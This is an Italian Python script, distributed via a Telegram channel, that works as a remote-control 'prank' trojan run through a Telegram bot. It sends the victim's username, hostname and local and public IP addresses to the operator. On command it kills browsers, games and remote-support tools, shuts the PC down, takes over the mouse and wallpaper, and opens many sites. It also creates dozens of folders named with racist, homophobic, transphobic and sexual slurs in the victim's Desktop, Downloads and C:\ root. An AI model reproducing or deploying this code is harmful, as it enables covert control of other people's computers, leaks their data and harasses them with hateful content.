'''
Script realizzato da @AnItalianGigaChad e distribuito gratuitamente,
è severamente vietata la vendita e un uso scorretto.

Canale Telegram: https://t.me/system32virus

v1.4
'''
import pyautogui
import random
import telepot
import time
import ctypes
import getpass
import socket
import requests
import winsound
import psutil
import os
from pprint import pprint
from telepot.loop import MessageLoop
from telepot.namedtuple import ReplyKeyboardMarkup


#Configurazione bot
def davidId():
    return 123456789 #Scrivere qui il chatID senza le ""

def botToken():
    return "INSERIRE_IL_TOKEN" #Scrivere qui il token del bot tra ""

#Info PC
UserName = getpass.getuser()
hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)
publicIP = requests.get('https://checkip.amazonaws.com').text.strip()

#Conferma PC acceso
def waitForInternetConnection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False

#Conferma processo attivo
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

#Arresto processi
def killExplorer():
    if(explorerRunning()):
        os.system("taskkill /f /im explorer.exe")
def explorerRunning():
    return checkIfProcessRunning("explorer.exe")
def killDiscord():
    if(discordRunning()):
        os.system("taskkill /f /im Discord.exe")
def discordRunning():
    return checkIfProcessRunning("Discord.exe")
def killMinecraft():
    if(minecraftRunning()):
        os.system("taskkill /f /im javaw.exe")
def minecraftRunning():
    return checkIfProcessRunning("javaw.exe")
def killChrome():
    if(chromeRunning()):
        os.system("taskkill /f /im chrome.exe")
def chromeRunning():
    return checkIfProcessRunning("chrome.exe")
def killFortnite():
    if(fortniteRunning()):
        os.system("taskkill /f /im FortniteClient-Win64-Shipping.exe")
def fortniteRunning():
    return checkIfProcessRunning("FortniteClient-Win64-Shipping.exe")
def killTelegram():
    if(telegramRunning()):
        os.system("taskkill /f /im Telegram.exe")
def telegramRunning():
    return checkIfProcessRunning("Telegram.exe")
def killDiscord():
    if(discordRunning()):
        os.system("taskkill /f /im Discord.exe")
def discordRunning():
    return checkIfProcessRunning("Discord.exe")
def apexRunning():
    return checkIfProcessRunning("r5apex.exe")
def killApex():
    if(apexRunning()):
        os.system("taskkill /f /im r5apex.exe")
def killFortniteLauncher():
    if(fortniteLauncherRunning()):
        os.system("taskkill /f /im EpicGamesLauncher.exe")
def fortniteLauncherRunning():
    return checkIfProcessRunning("EpicGamesLauncher.exe")
def killEdge():
    if(edgeRunning()):
        os.system("taskkill /f /im msedge.exe")
def edgeRunning():
    return checkIfProcessRunning("msedge.exe")
def killSteam():
    if(steamRunning()):
        os.system("taskkill /f /im steam.exe")
def steamRunning():
    return checkIfProcessRunning("steam.exe")
def killTeamspeak():
    if(teamspeakRunning()):
        os.system("taskkill /f /im Ts3client_win64.exe")
def teamspeakrunning():
    return checkIfProcessRunning("Ts3client_win64.exe")
def killSpotify():
    if(spotifyRunning()):
        os.system("taskkill /f /im Spotify.exe")
def spotifyRunning():
    return checkIfProcessRunning("Spotify.exe")
def killAnyDesk():
    if(anydeskRunning()):
        os.system("taskkill /f /im AnyDesk.exe")
def anydeskRunning():
    return checkIfProcessRunning("AnyDesk.exe")
def killTeamViewer():
    if(teamviewerRunning()):
        os.system("taskkill /f /im TeamViewer_Service.exe")
def teamviewerRunning():
    return checkIfProcessRunning("TeamViewer_Service.exe")
def killFirefox():
    if(firefoxRunning()):
        os.system("taskkill /f /im firefox.exe")
def firefoxRunning():
    return checkIfProcessRunning("firefox.exe")
def killAll():
    killDiscord()
    killMinecraft()
    killChrome()
    killFortnite()
    killTelegram()
    killDiscord()
    killApex()
    killFortniteLauncher()
    killEdge()
    killSteam()
    killTeamspeak()
    killSpotify()
    killAnyDesk()
    killTeamViewer()
    kilFirefox()

#Arresto PC
def shutdownPc():
    os.system('shutdown -s -t 0')

def Mouse():
    pyautogui.moveTo(random.randrange(10, 1900), random.randrange(10, 1900))
    pyautogui.moveTo(random.randrange(10, 1900), random.randrange(10, 1900))
    pyautogui.moveTo(random.randrange(10, 1900), random.randrange(10, 1900))
    pyautogui.moveTo(random.randrange(10, 1900), random.randrange(10, 1900))
    pyautogui.moveTo(random.randrange(10, 1900), random.randrange(10, 1900))
    
def bassboosted():
    os.system('start https://www.youtube.com/watch?v=rBjkkHmb_oY')

def Crazy():
    os.chdir(PercDownloads)
    url = 'https://images4.alphacoders.com/120/1205937.jpg'
    r = requests.get(url)
    name = "crazy_image.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
    pyautogui.FAILSAFE = False
    os.system('start https://www.youtube.com/watch?v=opIpomJQ4vU')
    Mouse()
    time.sleep(0.3)
    os.system('start http://www.risolvigeometria.it/')
    Mouse()
    time.sleep(0.3)
    os.system('start calc')
    Mouse()
    time.sleep(0.3)
    os.system('start https://www.youtube.com/watch?v=xWOupT4y7QQ')
    Mouse()
    time.sleep(0.3)
    os.system('start notepad')
    Mouse()
    time.sleep(0.3)
    os.system('start https://www.youtube.com/watch?v=NrMJn5ivljU')
    Mouse()
    time.sleep(0.3)
    os.system('start https://www.youtube.com/watch?v=vUmyklRlQSg')
    Mouse()
    time.sleep(0.3)
    os.system('start https://www.youtube.com/watch?v=cwVJAPBqwdI')
    Mouse()
    time.sleep(0.3)
    os.system('start https://ascoltareradio.com/')
    Mouse()
    time.sleep(0.3)
    os.system('start https://www.giochi.it/')
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)
    Mouse()
    time.sleep(0.3)

def Beep():
    winsound.Beep(3500, 5000)

PercHome = (os.path.expanduser('~'))
PercDesktop = (PercHome+"\\Desktop")
PercDownloads = (PercHome+"\\Downloads")

def Insulti():
    url = 'https://www.ansa.it/webimages/img_700/2022/2/22/956aaa4933ec46638c565914b242d4e8.jpg'
    r = requests.get(url)
    name = "coglione_image.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
    os.mkdir("merda_umana")
    os.mkdir("stronzo")
    os.mkdir("coglione")
    os.mkdir("mignotta")
    os.mkdir("puttana")
    os.mkdir("mortacci_tua")
    os.mkdir("kitemmuort")
    os.mkdir("sfaccimm")
    os.mkdir("terrone")
    os.mkdir("tamarro_del_cazzo")
    os.mkdir("vaffanculo")
    os.mkdir("bevi_sborra")
    os.mkdir("negr0")
    os.mkdir("froci0")
    os.mkdir("gay_del_cazzo")
    os.mkdir("transone")
    os.mkdir("succhiamelo")
    os.mkdir("bimbo_nutella")
    os.mkdir("bimbo_minchia")
    os.mkdir("africano")
    os.mkdir("cinese")
    os.mkdir("zoccola")
    os.mkdir("baldracca")
    os.mkdir("ciccione")
    os.mkdir("obeso")
    os.mkdir("barile")
    os.mkdir("gorilla")
    os.mkdir("deficente")
    os.mkdir("imbecille")
    os.mkdir("testa_di_cazzo")
    os.mkdir("ricchione")
    os.mkdir("leccaculo")
    os.mkdir("vergine")
    os.mkdir("ciollina")
    os.mkdir("verginello")
    os.mkdir("succhiacazzi")
    os.mkdir("mangiamerda")
    os.mkdir("rifiuto")
    os.mkdir("porno_gay")
    os.mkdir("pezzente")
    os.mkdir("cafone")
    os.mkdir("barbaro")
    os.mkdir("plebeo")
    os.mkdir("gentleman")
    os.mkdir("roblox")
    os.mkdir("vafammoc")
    os.mkdir("2009")
    os.mkdir("babygang")
    os.mkdir("suca")
    os.mkdir("pornhub_videos")
    os.mkdir("pornhub_gay")
    os.mkdir("pornhub_trans")
    os.mkdir("pornhub_funny")
    os.mkdir("pornhub_evaelfie")
    os.mkdir("pornhub_lanarhoades")
    os.mkdir("pornhub_tuamadre")
    os.mkdir("youporn")
    os.mkdir("sussy")
    os.mkdir("amogus")
    os.mkdir("amongus")
    os.mkdir("amosus")
    os.mkdir("sus")
    os.mkdir("leagueoflegends")
    os.mkdir("robloxgang")
    os.mkdir("ackerini")
    os.mkdir("maincraft")

#Comandi
def handle(msg):
    contentType, chatType, chatId = telepot.glance(msg)
    pprint(msg['text'])
    text = msg['text']
    if not (chatId == davidId()):
        bot.sendMessage(chatId, "Accesso non autorizzato, controlla che il chatID (davidId) sia corretto.")
        bot.sendMessage(davidId(), 'Qualcuno ha tentato di accedere al bot, il suo tentativo di accesso è stato rifiutato')
    if '/start' in text:
        bot.sendMessage(davidId(), "Accesso autorizzato, scrivere /help per i comandi")
    if '/info' in text:
        bot.sendMessage(davidId(), "Info:")
        bot.sendMessage(davidId(), "Hostname: " + hostname)
        bot.sendMessage(davidId(), "Username: " + UserName)
        bot.sendMessage(davidId(), "IPv4: " + IP)
        bot.sendMessage(davidId(), "IP Publico: " + publicIP)
    if '/killall' in text:
        killAll()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/killexplorer' in text:
        killExplorer()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/shutdown' in text:
        shutdownPc()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/bassboosted' in text:
        bassboosted()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/beep' in text:
        Beep()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/help' in text:
        bot.sendMessage(davidId(), "Comandi:")
        bot.sendMessage(davidId(), "/start: Comando d'avvio del Bot")
        bot.sendMessage(davidId(), "/info: Informazioni dispositivo")
        bot.sendMessage(davidId(), "/killall: Arresto di alcuni processi")
        bot.sendMessage(davidId(), "/killexplorer: Arresto del processo 'explorer.exe' (fa diventare lo schermo nero)")
        bot.sendMessage(davidId(), "/bassboosted: Avvio di chrome con un video bass boosted (thomas the train)")
        bot.sendMessage(davidId(), "/beep: Avvio frequenza 3500hz per 5000ms")
        bot.sendMessage(davidId(), "/shutdown: Spegnimento del dispositivo")
        bot.sendMessage(davidId(), "/crazy: Apre programmi e link a caso nel PC, muove il mouse a caso in tutto lo schermo, cambia lo sfondo del desktop con varie meme")
        bot.sendMessage(davidId(), "/insulti: Crea molte cartelle rinominate di insulti in varie directory, cambia lo sfondo del desktop con un marocchino")
        bot.sendMessage(davidId(), "/help: Lista comandi")
    if '/crazy' in text:
        Crazy()
        bot.sendMessage(davidId(), "Comando eseguito")
    if '/insulti' in text:
        os.chdir(PercDesktop)
        Insulti()
        os.chdir(PercDownloads)
        Insulti()
        os.chdir("C:\\")
        Insulti()
        bot.sendMessage(davidId(), "Comando eseguito")
        bot.sendMessage(davidId(), "La vittima e' stata insultata con successo :)")

time.sleep(1)
waitForInternetConnection()
bot = telepot.Bot(botToken())
MessageLoop(bot, handle).run_as_thread()
keyboard = ReplyKeyboardMarkup(keyboard=[['/info', '/killall'], ['/insulti', '/shutdown'], ['/crazy', '/help']])
bot.sendMessage(davidId(), 'PC Acceso', reply_markup=keyboard)
while 1:
    time.sleep(10)
